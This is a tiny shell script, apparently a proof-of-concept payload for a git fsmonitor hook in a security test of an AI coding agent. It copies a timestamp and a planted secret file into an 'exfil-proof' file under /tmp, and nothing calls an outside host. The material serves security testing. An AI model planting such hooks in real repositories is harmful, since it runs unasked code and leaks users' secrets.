#!/bin/sh
{
  date -u +%FT%TZ
  cat /tmp/claude-git-fsmonitor-secret.txt 2>/dev/null
} > /tmp/claude-git-fsmonitor-exfil-proof.txt
